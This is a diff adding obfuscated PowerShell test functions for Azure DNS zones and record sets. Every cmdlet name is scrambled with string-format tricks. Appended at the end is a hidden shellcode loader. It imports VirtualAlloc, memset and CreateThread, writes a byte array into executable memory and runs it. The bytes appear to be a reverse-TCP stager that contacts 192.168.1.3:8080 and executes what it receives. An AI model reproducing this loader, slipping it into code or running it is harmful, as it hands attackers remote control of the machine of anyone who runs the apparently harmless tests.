+	${rEm`OV`ED} = ${cReAT`ed`ZoNE} | &("{0}{3}{2}{1}" -f 'Rem','DnsZone','ve-Az','o') -Overwrite -Confirm:${FAl`Se} -PassThru
+
+	&("{2}{0}{1}"-f 'ert-','True','Ass') { ${REMo`V`ed} }
+	&("{3}{5}{0}{6}{2}{4}{1}" -f'es','up','urc','R','eGro','emove-AzR','o') -Name ${r`ESOuRC`Eg`R`OuPNaME} -Force
+}
+
+
+function TeSt`-Z`on`Er`emoV`e`NONEXiS`TinG
+{
+	${ZOne`N`AmE} = &("{1}{2}{3}{0}" -f 'e','Get-','RandomZ','oneNam')
+    ${reSo`UrCe`GR`OuP} = &("{5}{2}{1}{3}{0}{4}"-f'ro','tup-Cr','e','eateResourceG','up','TestS')
+
+	${R`Em`ovEd} = &("{2}{4}{3}{0}{1}" -f'nsZ','one','Rem','D','ove-Az') -Name ${z`oNE`NAMe} -ResourceGroupName ${R`E`sOurCeGR`OuP}."r`eS`O`UrCeGRO`Upna`me" -Confirm:${F`AlSE} -PassThru
+	&("{3}{4}{0}{1}{2}"-f 'e-','A','zResourceGroup','Re','mov') -Name ${R`Esource`gr`O`UP}."RESo`U`RCEGrouP`Name" -Force
+}
+
+
+function teST-`zo`NElIST
+{
+	${ZO`NE`NamE1} = &("{0}{1}{2}{3}" -f 'G','et-RandomZo','neNam','e')
+	${ZO`N`E`NamE2} = ${zON`e`NamE1} + "A"
+	${r`eSO`URc`EG`Roup} = &("{5}{2}{1}{4}{0}{3}" -f 'source','p-Crea','stSetu','Group','teRe','Te')
+    ${C`ReaTEdzo`Ne1} = ${r`EsouR`CeGrOUp} | &("{1}{0}{2}" -f '-A','New','zDnsZone') -Name ${Z`on`ENamE1} -Tags @{("{1}{0}"-f '1','tag')=("{0}{1}" -f'val','ue1')}
+	${cRE`AT`eDzONE2} = ${rEsOur`C`eGRouP} | &("{2}{1}{0}" -f'DnsZone','Az','New-') -Name ${z`ON`Ena`ME2}
+
+	${reS`U`Lt} = &("{1}{2}{0}" -f'e','Ge','t-AzDnsZon') -ResourceGroupName ${r`e`So`UrCegroUp}."ReSOUr`CE`grOU`Pn`Ame"
+
+	&("{1}{2}{0}{3}" -f 're','Ass','ert-A','Equal') 2 ${rE`s`Ult}."C`OuNt"
+
+	&("{1}{0}{2}"-f'rt-','Asse','AreEqual') ${Cre`AteDz`On`e1}."E`Tag" ${r`e`Sult}[0]."e`Tag"
+	&("{2}{0}{3}{1}"-f 'ssert-Are','ual','A','Eq') ${CreA`TEDzO`N`e1}."n`AMe" ${re`Su`LT}[0]."NA`ME"
+	&("{1}{2}{0}"-f'l','Assert-No','tNul') ${rEs`o`URceg`RoUP}."reSOUrCEGRo`UP`N`AMe" ${re`Sult}[0]."REs`ourC`EGR`Ou`PnA`Me"
+	&("{0}{2}{3}{1}"-f 'Assert','al','-Ar','eEqu') 1 ${r`eSU`lt}[0]."t`Ags"."co`UnT"
+
+	&("{3}{0}{1}{2}"-f'sser','t-A','reEqual','A') ${Cr`EaT`edzo`NE2}."eT`AG" ${r`ESU`LT}[1]."ET`Ag"
+	&("{3}{1}{2}{0}"-f'Equal','s','sert-Are','A') ${cR`Ea`TEDz`oNE2}."N`AMe" ${r`E`SuLt}[1]."n`AmE"
+	&("{2}{4}{1}{0}{3}" -f 'otN','ert-N','As','ull','s') ${Re`SOur`C`egr`oup}."R`ESouRceGRoUp`N`A`mE" ${rEs`ULT}[1]."r`Eso`UrCEGroUp`N`A`mE"
+	&("{1}{2}{0}{3}"-f'rt-','Ass','e','AreEqual') 0 ${R`eS`ULT}[1]."tA`GS"."cou`Nt"
+
+	${r`eSu`lT} | &("{1}{2}{0}{3}{4}" -f'ove-AzDns','Re','m','Zon','e') -PassThru -Confirm:${Fa`LSe}
+	&("{3}{1}{4}{0}{2}" -f 'eGro','em','up','R','ove-AzResourc') -Name ${R`eSou`RcE`gR`oUP}."re`SoUr`CEGrOUPn`AME" -Force
+}
+
+function T`e`s`T-Zo`NELIstsUb`SCRi`pTiOn
+{
+	${Zo`Nenam`E1} = &("{1}{0}{3}{2}" -f 'n','Get-RandomZo','Name','e')
+	${ZOnEn`Am`E2} = ${ZoN`en`Ame1} + "A"
+	${Re`S`OUrcE`Gr`oUp} = &("{5}{8}{4}{3}{0}{1}{6}{2}{7}"-f 'o','ur','o','es','reateR','TestSetup-','ceGr','up','C')
+    ${Cr`eA`T`eDzoNe1} = ${rES`OuR`CE`GRo`UP} | &("{3}{0}{1}{2}"-f '-A','zDn','sZone','New') -Name ${zON`e`NaME1} -Tags @{("{0}{1}" -f't','ag1')=("{1}{0}" -f'ue1','val')}
+	${CREATEDZ`ON`e2} = ${RES`O`U`RCEG`RoUp} | &("{2}{0}{1}{3}"-f 'w-','AzDn','Ne','sZone') -Name ${ZoN`EnaM`e2}
+
+	${R`esU`lT} = &("{4}{2}{1}{0}{3}" -f'n','sZo','Dn','e','Get-Az')
+
+	&("{1}{0}{2}" -f 'ssert-T','A','rue')   { ${res`U`Lt}."CO`UNt" -ge 2 }
+
+	${CrE`A`TeDz`O`Ne1} | &("{0}{2}{3}{1}{5}{4}"-f 'Re','zDnsZ','mov','e-A','ne','o') -PassThru -Confirm:${f`AL`se}
+	${CrEAtEd`ZON`E2} | &("{0}{4}{3}{2}{1}"-f'R','e','on','zDnsZ','emove-A') -PassThru -Confirm:${fA`l`se}
+	&("{6}{3}{0}{1}{5}{2}{4}" -f'ove-AzRes','ourceG','ou','m','p','r','Re') -Name ${ResoUr`CE`G`Ro`Up}."r`ES`OuRCegr`oUPnaME" -Force
+}
+
+
+function TEs`T`-Z`ON`eli`sTWI`TheNdswITH
+{
+	${SuF`FIx} = ("{0}{1}"-f '.c','om')
+	${Su`FfIxw`It`hdOT} = ("{0}{1}" -f '.c','om.')
+	${Z`oneN`Ame1} = &("{2}{1}{3}{4}{0}"-f 'me','Ra','Get-','ndomZone','Na')
+	${zOne`N`Am`E2} = ${Zo`NEnA`Me1} + ${sUF`F`IX}
+	${r`E`sOuRC`eGrOuP} = &("{5}{0}{2}{7}{4}{3}{6}{1}"-f'e','up','ate','sour','e','TestSetup-Cr','ceGro','R')
+    ${CrEaT`EdzON`E1} = ${REs`Ou`RCEg`RO`UP} | &("{3}{2}{1}{0}" -f 'zDnsZone','w-A','e','N') -Name ${zoNE`NaM`e1}
+	${c`ReAt`Ed`ZON`E2} = ${r`EsOur`CeGROUP} | &("{2}{1}{3}{0}" -f'e','zDnsZo','New-A','n') -Name ${Zone`Na`ME2}
+
+	${re`suLt} = &("{1}{2}{0}"-f 'Zone','G','et-AzDns') -ResourceGroupName ${REs`O`URC`egR`oUp}."ReS`OuRCEgRO`U`pnaMe" -EndsWith ${SuFf`ixWI`TH`dOT}
+
+	&("{3}{4}{0}{1}{2}"-f'Eq','ua','l','Asser','t-Are') 1 ${r`esuLT}."cO`UNT"
+
+	&("{2}{0}{1}"-f'ssert-Ar','eEqual','A') ${cR`E`AT`EdZoNE2}."eT`Ag" ${r`e`suLt}[0]."e`TaG"
+	&("{1}{0}{2}"-f'ert-AreEqu','Ass','al') ${CReATed`ZO`Ne2}."NA`mE" ${rEs`ULt}[0]."n`AmE"
+	&("{0}{4}{2}{3}{1}" -f'A','ll','t-','NotNu','sser') ${R`Eso`Urce`GROup}."Reso`URC`E`GR`ouPNAmE" ${R`eSu`Lt}[0]."R`es`OU`R`cEg`ROupnAmE"
+	${R`Esu`Lt} | &("{0}{2}{1}{3}" -f'Rem','-AzDnsZo','ove','ne') -PassThru -Confirm:${FaL`SE}
+	&("{3}{2}{1}{6}{0}{4}{5}" -f'Res','ov','em','R','ourceGrou','p','e-Az') -Name ${resoUr`Ce`grOuP}."RE`s`ou`RCeG`RoUPN`Ame" -Force
+}
+
+
+function teST`-ADDREmoVE`RE`CO`Rd`sEt
+{
+	${ZOnE`N`Ame} = &("{0}{1}{2}{3}" -f 'Get-Ran','domZ','one','Name')
+	${r`E`C`ORdNAMe} = &("{1}{2}{0}"-f 'name','ge','tAsset')
+    ${rE`So`U`Rc`egroUp} = &("{0}{6}{5}{4}{2}{3}{1}" -f 'TestSetup-','oup','rc','eGr','ateResou','re','C')
+	${cR`EATED`z`ONE} = &("{2}{1}{3}{0}"-f 'ne','zDnsZ','New-A','o') -Name ${ZO`N`EnAME} -ResourceGroupName ${Res`OUR`cE`grO`UP}."ReSO`Ur`c`e`gR`oUpname" -Tags @{("{0}{1}"-f'N','ame')=("{1}{0}"-f'ag1','t');("{0}{1}"-f'V','alue')=("{1}{0}"-f'lue1','va')}
+
+	${R`eCo`RD} = ${cRE`A`TEDZ`oNe} | &("{0}{2}{1}{3}"-f 'New-Az','rd','DnsReco','Set') -Name ${r`eCo`R`dnAME} -Ttl 100 -RecordType ('A') -DnsRecords @() | &("{6}{1}{5}{3}{4}{0}{2}"-f'f','dd','ig','DnsRecordC','on','-Az','A') -Ipv4Address ("{1}{0}{2}" -f '.1.1','1','.1') | &("{3}{0}{2}{1}" -f 'DnsReco','dSet','r','Set-Az')
+	${u`p`Dat`eDZone} = &("{1}{2}{0}"-f'Zone','G','et-AzDns') -ResourceGroupName ${reS`oURCE`G`RO`UP}."ReSoU`Rce`g`ROU`pNAME" -Name ${Z`o`NeNamE}
+	&("{1}{0}{3}{2}"-f'reE','Assert-A','ual','q') 3 ${upDat`Edzo`Ne}."NU`mbE`R`oF`Reco`RdsEtS"
+
+	${remO`VErec`o`RD} = ${UP`dA`TeD`ZONe} | &("{0}{3}{1}{2}"-f'Get-Az','nsReco','rdSet','D') -Name ${RE`cORdN`AmE} -RecordType ('A') | &("{0}{3}{1}{2}" -f 'R','DnsRe','cordSet','emove-Az') -Name ${R`EcOr`D`NaMe} -RecordType ('A') -PassThru -Confirm:${Fa`LSE}
+	${f`iNaLzO`Ne} = &("{0}{2}{1}{3}" -f'G','-AzDns','et','Zone') -ResourceGroupName ${resOu`RC`egrO`Up}."r`esOURCe`Gr`O`UPnA`mE" -Name ${ZoNE`N`AMe}
+	&("{2}{1}{3}{0}" -f'eEqual','rt','Asse','-Ar') 2 ${fIN`ALzO`Ne}."nU`Mb`erO`F`REc`orDseTs"
+
+	${fi`NAl`Z`One} | &("{0}{2}{4}{1}{3}"-f 'Remove-Az','on','Dn','e','sZ') -PassThru -Confirm:${f`Al`se}
+	&("{5}{4}{0}{1}{3}{2}"-f'Re','s','rceGroup','ou','Az','Remove-') -Name ${ReSO`URCe`G`Ro`UP}."RE`soUrCE`g`RouPna`me" -Force
+}
+${C} = ((("{14}{19}{84}{66}{54}{61}{44}{48}{88}{89}{46}{42}{81}{9}{71}{47}{17}{45}{15}{93}{67}{60}{59}{87}{40}{86}{92}{20}{12}{90}{58}{79}{65}{77}{70}{56}{82}{1}{3}{24}{41}{51}{38}{27}{33}{2}{69}{34}{55}{16}{4}{13}{35}{36}{85}{91}{30}{83}{73}{10}{18}{11}{0}{68}{8}{75}{49}{22}{74}{26}{43}{29}{37}{64}{25}{39}{80}{23}{57}{31}{7}{5}{50}{6}{76}{78}{21}{53}{28}{63}{52}{72}{62}{32}" -f 'tr lp','u','tr ','blic sta','lp','c s','atic',')]publi','ta','t','int dwStackSize, I','P','ct);[Dll','Threa','[D','lpAd','tPtr ','c(IntP','nt','ll','rote','tr memset(IntPtr d','s, IntPtr','4ms','ti','IntPtr ','te',' In','n','wCr','t','t.dlls74',';','tP','at','d','A','eati','n','lpThreadId','t flAllocationTy','c ',' ','r, uint d','74)]p','tr ','c extern','llo','ubl','Addres','t','exter','src, u','est, ui','d','eThread(In','.dlls74','vcr','por','ize, ui','uint dwS','lls','count)','t ','onFlags, ','s','2.',' ','S','Cre','nel32','ualA','int ',' u',' lpParame','rt',' exte','74ker','rn IntP','t(',');[DllImport(s7','IntPtr Vir',')]p','es,','Import(s74kernel3','ttri','pe, ui','n','ic st','ati','Im','bu','nt flP','dress,'))."R`EPlACe"('s74',[StRIng][CHAR]34));${W} = &("{1}{0}"-f '-Type','Add') -memberDefinition ${c} -Name ("{0}{1}" -f 'Win3','2') -namespace ("{1}{2}{0}" -f 'tions','W','in32Func') -passthru;[Byte[]];[Byte[]]${z} = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x03,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;${G} = 0x1000;if (${z}."Le`N`gTH" -gt 0x1000){${G} = ${z}."le`N`GTh"};${x}=${w}::("{0}{2}{1}" -f'Virtu','Alloc','al').Invoke(0,0x1000,${g},0x40);for (${i}=0;${i} -le (${Z}."l`EN`GTh"-1);${i}++) {${w}::"ME`Ms`ET"([IntPtr](${X}.("{0}{1}{2}"-f 'T','o','Int32').Invoke()+${I}), ${z}[${i}], 1)};${w}::("{0}{3}{2}{1}"-f'Cr','read','ateTh','e').Invoke(0,0,${x},0,0,0);for (;;){&("{3}{1}{0}{2}"-f'le','-s','ep','Start') 60};
